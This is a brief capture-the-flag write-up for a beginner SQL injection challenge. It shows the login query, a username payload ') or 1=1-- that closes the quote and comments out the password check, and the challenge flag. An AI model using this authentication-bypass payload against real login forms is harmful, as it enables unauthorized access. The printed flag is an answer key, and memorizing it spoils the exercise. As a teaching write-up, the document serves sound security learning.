* Category
  * SQL injection
* Solution
  1. SQL command
    * ```SELECT * FROM admin WHERE (username='') AND (password='')```
    * use ```'``` to close the single quote and ```--``` to comment the ```) AND (password='')``` part
* Payload
  1. username = ```') or 1=1--```
  2. password = ```ARBITRARY-VALUE``` (except null)
* ```FLAG{b4by_sql_inj3cti0n}```